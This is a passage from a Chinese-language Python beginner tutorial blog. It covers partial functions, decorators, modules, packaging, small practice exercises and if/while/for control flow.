<p><strong>运行结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752672056.png"></p>
<p><strong>filter函数</strong>可以用于对列表进行<strong>过滤操作</strong>，输出其值不符合条件的元素。</p>
<h2 id="5-5-3-偏函数partial"><a href="#5-5-3-偏函数partial" class="headerlink" title="5.5.3 偏函数partial"></a>5.5.3 偏函数partial</h2><blockquote>
<p>使用偏函数固定某个函数的参数值。</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log</span>(<span class="params">message,subsystem</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%s: %s&quot;</span>%(subsystem,message))</span><br><span class="line">    </span><br><span class="line">server_log = functools.partial(log,subsystem = <span class="string">&#x27;server&#x27;</span>)</span><br><span class="line">server_log(<span class="string">&quot;right&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>注意点</strong>：<br>1、<code>partial函数</code>需要导入<code>functools模块</code>才可以使用。<br>2、其作用就是将一个已有的函数变成一个<strong>某些参数固定</strong>的新函数。<br>3、此函数<strong>多用于日志</strong>。</p>
<h2 id="5-5-4-修饰器（装饰器）"><a href="#5-5-4-修饰器（装饰器）" class="headerlink" title="5.5.4 修饰器（装饰器）"></a>5.5.4 修饰器（装饰器）</h2><blockquote>
<p>为现有的函数或类添加新的功能。</p>
</blockquote>
<blockquote>
<p>装饰器的执行流程</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_prety</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;I got decorated&quot;</span>)</span><br><span class="line">        func()</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"></span><br><span class="line"><span class="meta">@my_prety</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ordinary</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;I am ordinary&quot;</span>)</span><br><span class="line">    </span><br><span class="line">ordinary()</span><br></pre></td></tr></table></figure>
<p><strong>运行结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752672059.png"></p>
<p><strong>分析上述代码</strong>：通过<code>@my_prety</code>标识<strong>my_prety</strong>为<strong>装饰器函数</strong>，当函数执行到这一句时就会去<strong>调用my_prety函数</strong>。这一句话的作用等价于：<code>ordinary = my_prety(ordinary)</code>。也就是说在调用执行ordinary函数时会<strong>调用后面的函数</strong>，这个函数以<code>ordinary</code>为<strong>参数</strong>。</p>
<blockquote>
<p>深入理解装饰器函数</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">w1</span>(<span class="params">func</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>(<span class="params">*argv</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;add inner called&quot;</span>)</span><br><span class="line">        func(*argv)</span><br><span class="line">    <span class="keyword">return</span> inner</span><br><span class="line"><span class="meta">@ w1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add1</span>(<span class="params">a,b</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%d+%d = %d &quot;</span>%(a,b,a+b))</span><br><span class="line"><span class="meta">@ w1    </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add2</span>(<span class="params">a,b,c</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%d+%d+%d= %d &quot;</span>%(a,b,c,c+a+b))</span><br><span class="line">    </span><br><span class="line">add1(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">add2(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p><strong>结果如下</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752672060.png"></p>
<p>对于<strong>原函数</strong>有参数的情况，<strong>闭包函数</strong>（也就是inner)也要有<strong>参数</strong>，并且为应对不同函数的参数数目不同的情况，可以使用<strong>可变参数和关键字参数</strong>。</p>
<h1 id="5-6-模块化编程"><a href="#5-6-模块化编程" class="headerlink" title="5.6 模块化编程"></a>5.6 模块化编程</h1><blockquote>
<p>老规矩，先放上思维导图：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752672061.png"></p>
<h2 id="5-6-1-内置模块"><a href="#5-6-1-内置模块" class="headerlink" title="5.6.1 内置模块"></a>5.6.1 内置模块</h2><blockquote>
<p>Python安装完毕后，就可以使用的模块</p>
</blockquote>
<p><strong>下面介绍几种模块的导入方法：</strong></p>
<ol>
<li>导入整个模块</li>
</ol>
<p><strong>语法格式</strong>：<code>import 模块名1，模块名2</code></p>
<p><strong>代码示例</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752672065.png"></p>
<p><strong>注</strong>：使用<code>as</code>进行模块的别名<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752672057.png"></p>
<ol start="2">
<li>导入模块的某些成员</li>
</ol>
<p><strong>语法格式</strong>：<code>from 模块1 import 成员1，成员2</code></p>
<p><strong>代码示例</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752672063.png"></p>
<ol start="3">
<li>模块的查看方法</li>
</ol>
<p><strong>(1) 使用dir()函数进行查看</strong><br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752672062.png"></p>
<p><strong>注</strong>：使用dir查询得到的为一个列表，可以<strong>使用for in</strong> 进行遍历。<strong>如下例</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752672064.png"></p>
<p><strong>(2) 使用<code>__all__属性</code>进行查看</strong></p>
<p><strong>代码实例</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752672066.png"></p>
<p><strong>注</strong>：不是所有的模块都有<code>__all__</code>属性的。</p>
<h2 id="5-6-2-第三方模块"><a href="#5-6-2-第三方模块" class="headerlink" title="5.6.2 第三方模块"></a>5.6.2 第三方模块</h2><p><strong>第三方模块的查找</strong>：<a href="https://pypi.org/">https://pypi.org/</a></p>
<p><strong>模块的下载</strong>：<code>pip install xxxx</code></p>
<p><strong>Anaconda</strong> ：Python的发行版本，内置很多第三方库。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752672165.png"></p>
<h2 id="5-6-3-自定义模块"><a href="#5-6-3-自定义模块" class="headerlink" title="5.6.3 自定义模块"></a>5.6.3 自定义模块</h2><p>自己编写完成的脚本可以直接作为模块进行使用。<br>使用import 进行导入即可。</p>
<p>来看一个例子：</p>
<ol>
<li>先定义两个脚本文件main.py和prac.py</li>
</ol>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752672067.png"></p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752672084.png"></p>
<ol start="2">
<li>使用import main 将main.py作为模块导入prac.py。</li>
</ol>
<p><strong>运行结果如下</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752672179.png"><br>可见，在prac中可以使用main里的函数，这里main就相当于模块。</p>
<ol start="3">
<li>删除main文件里的name属性判断</li>
</ol>
<p><strong>结果如下</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752672180.png"></p>
<p>这里执行prac，发现会先执行main模块里的操作，再进行本程序操作。这是因为prac将main当做了一个直接执行的文件了。</p>
<p>通过上述例子我们可以直观的看到<code>__name__</code>属性的作用：<strong>用于区分一个文件是模块还是直接执行文件</strong>。<br>其<strong>原理</strong>也很简单，如果在程序中加上此代码，就会在执行此文件前进行判断，当其作为模块被导入时，<code>__name__ </code>属性不会等于main,不满足判断条件，也就不会直接执行了。</p>
<h1 id="5-7-Pyinstaller-打包"><a href="#5-7-Pyinstaller-打包" class="headerlink" title="5.7 Pyinstaller 打包"></a>5.7 Pyinstaller 打包</h1><blockquote>
<p>将py脚本打包成为exe文件。</p>
</blockquote>
<p><strong>下载方法</strong>：<code>pip install pyinstall</code><br><strong>使用方法</strong>：<code>pyinstaller -F 脚本位置</code></p>
<p>通过pyinstaller -h 查看帮助文档。</p>
<h1 id="5-8-练习补充"><a href="#5-8-练习补充" class="headerlink" title="5.8 练习补充"></a>5.8 练习补充</h1><blockquote>
<p>内容来自实训和测试</p>
</blockquote>
<h2 id="测试–函数部分"><a href="#测试–函数部分" class="headerlink" title="测试–函数部分"></a>测试–函数部分</h2><p>1、len(dict)是作用于key.<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752672181.png"></p>
<hr>
<p>2、sort方法的扩展</p>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752672192.png"></p>
<p>使用<strong>lambda表达式</strong>指定比较对象。</p>
<hr>
<p>3、列表的可变性<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752672190.png"></p>
<p>传递列表时传递的是<strong>存储位置</strong>，一变皆变。</p>
<h2 id="实训作业"><a href="#实训作业" class="headerlink" title="实训作业"></a>实训作业</h2><blockquote>
<p>1、最大公约数与最小公倍数</p>
</blockquote>
<p>使用<strong>辗转相除法</strong>进行求解。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#gcd为求最大公约数的函数</span></span><br><span class="line"><span class="comment">#lcm为求最小公倍数的函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;求最大公约数&quot;&quot;&quot;</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">      计算最大公约数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      :param x: 正整数</span></span><br><span class="line"><span class="string">      :param y：正整数</span></span><br><span class="line"><span class="string">      :return: 返回最大公约数</span></span><br><span class="line"><span class="string">      &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment">#        请在此处添加代码       #</span></span><br><span class="line">    <span class="comment"># *************begin************#</span></span><br><span class="line">    <span class="keyword">if</span> x%y == <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">return</span> y</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="keyword">return</span> gcd(y,x%y)</span><br><span class="line">    <span class="comment"># **************end*************#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lcm</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;求最小公倍数&quot;&quot;&quot;</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">          计算最小公倍数</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">          :param x: 正整数</span></span><br><span class="line"><span class="string">          :param y：正整数</span></span><br><span class="line"><span class="string">          :return: 返回最小公倍数</span></span><br><span class="line"><span class="string">          &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment">#        请在此处添加代码       #</span></span><br><span class="line">    <span class="comment"># *************begin************#</span></span><br><span class="line">    m  = gcd(x,y)</span><br><span class="line">    <span class="keyword">return</span> x*y//m</span><br><span class="line">    <span class="comment"># **************end*************#</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>2、整数的回文判断</p>
</blockquote>
<p>先化为字符串再判断。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_palindrome</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    判断一个数是不是回文数</span></span><br><span class="line"><span class="string">    :param num: 正整数</span></span><br><span class="line"><span class="string">    :return: 是回文数返回True，不是回文数返回False</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    num1 = <span class="built_in">str</span>(num)</span><br><span class="line">    <span class="keyword">return</span> num1 == num1[::-<span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<blockquote>
<p>3、求解素数</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_prime</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    判断一个数是不是素数</span></span><br><span class="line"><span class="string">    :param num: 正整数</span></span><br><span class="line"><span class="string">    :return: 是素数返回True，不是素数返回False</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,num):</span><br><span class="line">        <span class="keyword">if</span> num % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>4、莱布尼兹公式计算Π值</p>
</blockquote>
<p>莱布尼兹公式：π &#x3D; 4&#x2F;1 − 4&#x2F;3 + 4&#x2F;5 − 4&#x2F;7 + 4&#x2F;9 − 4&#x2F;11…</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">estimate_pi_by_leibniz</span>(<span class="params">n_terms = <span class="number">1000</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    通过莱布尼兹公式计算 pi 值，此方法不容易得到 15 位精度的 pi 值</span></span><br><span class="line"><span class="string">    莱布尼兹公式：π = 4/1 − 4/3 + 4/5 − 4/7 + 4/9 − 4/11…</span></span><br><span class="line"><span class="string">    :param n_terms:计算项数 n，默认值 1000</span></span><br><span class="line"><span class="string">    :return:返回保留小数点后15位的 pi 值</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pi = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n_terms):</span><br><span class="line">        pi += <span class="number">1</span>/((-<span class="number">1</span>)**i*(<span class="number">2</span>*i+<span class="number">1</span>))</span><br><span class="line">    pi *= <span class="number">4</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">round</span>(pi,<span class="number">15</span>)</span><br></pre></td></tr></table></figure>

<p>通过-1的<strong>n次方</strong>获取正负.</p>
]]></content>
      <categories>
        <category>【-基础知识-】编程语言学习</category>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python学习-ch4 流程控制</title>
    <url>/2023/04/10/Python%E8%AF%BE%E7%A8%8B%E5%AD%A6%E4%B9%A0-ch4%20%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/</url>
    <content><![CDATA[<h1 id="分支结构"><a href="#分支结构" class="headerlink" title="分支结构"></a>分支结构</h1><blockquote>
<p>思维导图如下：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752639590.png"></p>
<h2 id="if语句的三种方式"><a href="#if语句的三种方式" class="headerlink" title="if语句的三种方式"></a>if语句的三种方式</h2><blockquote>
<p>单分支结构</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件：</span><br><span class="line">		代码块</span><br></pre></td></tr></table></figure>

<ol>
<li>此结构可以用于字典的调用，提高健壮性</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">mydict = <span class="built_in">dict</span>(name=<span class="string">&#x27;xyq&#x27;</span>,age=<span class="string">&#x27;21&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">in</span> mydict:</span><br><span class="line">		mydict.pop(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">		</span><br><span class="line"><span class="built_in">print</span>(mydict)</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>列表中也可以使用</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mylist = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="number">2</span> <span class="keyword">in</span> mylist:</span><br><span class="line">		mylist.remove(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(mylist)</span><br></pre></td></tr></table></figure>

<hr>
<blockquote>
<p>双分支结构</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> 条件：</span><br><span class="line">		代码块</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">		代码块</span><br></pre></td></tr></table></figure>

<p><strong>代码示例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="built_in">input</span>(<span class="string">&quot;你的名字：&quot;</span>)</span><br><span class="line">age = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;你的年龄：&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> name == <span class="string">&#x27;xyq&#x27;</span> <span class="keyword">and</span> age == <span class="number">21</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;right!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;wrong!&quot;</span>)</span><br></pre></td></tr></table></figure>

<hr>
<blockquote>
<p>多分支结构</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> 条件<span class="number">1</span>：</span><br><span class="line">	代码块<span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> 条件<span class="number">2</span>：</span><br><span class="line">	代码块<span class="number">2</span></span><br><span class="line">    .....</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	代码块n</span><br></pre></td></tr></table></figure>

<p><strong>代码示例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">name = <span class="built_in">input</span>(<span class="string">&quot;你的名字：&quot;</span>)</span><br><span class="line">age = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;你的年龄：&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> name == <span class="string">&#x27;xyq&#x27;</span> <span class="keyword">and</span> age == <span class="number">21</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;right!&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> name == <span class="string">&#x27;xyq&#x27;</span> <span class="keyword">or</span> age == <span class="number">21</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;little right!&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;wrong!&quot;</span>)</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
<h2 id="if语句需要注意的问题"><a href="#if语句需要注意的问题" class="headerlink" title="if语句需要注意的问题"></a>if语句需要注意的问题</h2><blockquote>
<p>问题1：代码缩进</p>
</blockquote>
<p>对于条件判断后的代码，处于同一个缩进的代码为一个代码块</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> age &gt;=<span class="number">21</span>:</span><br><span class="line">--------------</span><br><span class="line">:	m = <span class="number">2</span>		:</span><br><span class="line">:	<span class="built_in">print</span>(<span class="string">&quot;yes&quot;</span>):</span><br><span class="line">--------------	</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">------------</span><br><span class="line">:	m=<span class="number">3</span>     :</span><br><span class="line">------------</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;no&quot;</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>问题2：条件判断</p>
</blockquote>
<p>不一定是bool类型，也可以是：None , 0 , [] , {}</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">list</span>  = []</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">list</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;yes&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;no&quot;</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>问题3：if多分支情况</p>
</blockquote>
<p>对于多分支情况，要注意条件的排布顺序</p>
<hr>
<blockquote>
<p>补充：pass语句</p>
</blockquote>
<p>pass语句是空语句，它的作用是占位，使得程序看起来完整。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> 条件：</span><br><span class="line">	<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<h1 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h1><blockquote>
<p>思维导图如下：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752639724.gif" title="[[[1645955236823]]]"></p>
<h2 id="while循环结构"><a href="#while循环结构" class="headerlink" title="while循环结构"></a>while循环结构</h2><blockquote>
<p>语句格式</p>
<blockquote>
<p>本质上还是条件判断语句，只是条件成立时继续执行直到退出。（一般<strong>不知道循环次数</strong>时使用此循环）</p>
</blockquote>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">while</span> 条件判断 ：</span><br><span class="line">	代码块</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<p><strong>代码示例</strong>：（猜数）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">answer = random.randint(<span class="number">1</span>,<span class="number">100</span>)</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    number = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&quot;your answer:&quot;</span>))</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> number &gt; answer:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;小一点&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> number &lt; answer:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;大一点&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;对了&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;你猜了%d次&quot;</span>%count)</span><br></pre></td></tr></table></figure>
<p><strong>结果演示</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752639592.png"></p>
<p><strong>重点解析</strong>：</p>
<ol>
<li><code>random</code>模块的使用。产生随机数。</li>
<li><code>while true </code>可以进行无限循环，直到退出。</li>
<li><code>break</code>可以跳出一个循环，可以作为结束条件。</li>
</ol>
<p><strong>练习</strong>：（计算平均分数）<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752639657.png"></p>
<h2 id="for-in-循环结构"><a href="#for-in-循环结构" class="headerlink" title="for-in 循环结构"></a>for-in 循环结构</h2><blockquote>
<p>for in 语句格式</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> 遍历 <span class="keyword">in</span> 字符串、范围、列表等可迭代对象：</span><br><span class="line">	代码块</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<p><strong>代码示例</strong>：（求和）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):  </span><br><span class="line">	<span class="built_in">sum</span> += x</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure>

<p><strong>注意点</strong>：<br>range()生成的数字为<strong>前闭后开</strong>区间，所以range（101）从0到100。<br>在python3中，range()函数生成一个等差序列，不可变。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752639593.png"></p>
<h2 id="for-in-循环遍历列表和字典"><a href="#for-in-循环遍历列表和字典" class="headerlink" title="for in 循环遍历列表和字典"></a>for in 循环遍历列表和字典</h2><blockquote>
<p>遍历<strong>列表</strong>示例：</p>
</blockquote>
<p><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752639594.png"></p>
<hr>
<blockquote>
<p>enumerate()内置函数介绍：</p>
</blockquote>
<p><strong>作用</strong>：将一个<strong>可遍历的</strong>数据对象（列表、元组、字符串等）组合为一个索引序列<br><strong>格式</strong>：<code>enumerate(list1,start=0)</code></p>
<p><strong>代码示例</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752639608.png"></p>
<hr>
<blockquote>
<p>zip()内置函数介绍：</p>
</blockquote>
<p><strong>作用</strong>：将多个对象打包成一个个元组，而后返回这些元组组成的列表</p>
<p><strong>代码示例</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752639609.png"></p>
<hr>
<blockquote>
<p>for in 循环遍历字典：</p>
</blockquote>
<p>在正式循环之前，先来回顾一下字典中<strong>items</strong>的相关知识：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752639610.png"><br>看见，dict.items()将字典元素封装为<strong>元组</strong>，这也是<strong>for in 循环</strong>的基础。</p>
<p><strong>代码示例</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict3 = &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&#x27;xyq&#x27;</span>,<span class="string">&quot;age&quot;</span>:<span class="number">22</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第一种方法：</span></span><br><span class="line"><span class="keyword">for</span> k,n <span class="keyword">in</span> dict3.items():</span><br><span class="line">	<span class="built_in">print</span>(k,n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二种方法：</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> dict3.items():</span><br><span class="line">	<span class="built_in">print</span>(item)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 第三种方法：</span></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> dict3:</span><br><span class="line">	<span class="built_in">print</span>(key,dict3[key])</span><br></pre></td></tr></table></figure>
<p><strong>结果</strong>：<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752639661.png"></p>
<hr>
<blockquote>
<p>sorted()内置函数介绍：</p>
</blockquote>
<p>前面我们已经学习过了，这里提到这个函数是因为涉及到字典。对字典进行排序是<strong>依据键的大小</strong>,并且<strong>返回一个列表</strong>。<br><img src="https://images-blogs-1310566801.cos.ap-guangzhou.myqcloud.com/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1649752639658.png"></p>
<h2 id="break-与-continue"><a href="#break-与-continue" class="headerlink" title="break 与 continue"></a>break 与 continue</h2><blockquote>
<p>break：结束当前循环语句。<br>continue：立即返回到循环入口处。</p>
</blockquote>
<h2 id="代码实训–统计字符个数"><a href="#代码实训–统计字符个数" class="headerlink" title="代码实训–统计字符个数"></a>代码实训–统计字符个数</h2><blockquote>
<p>重点有以下几个：</p>
<blockquote>
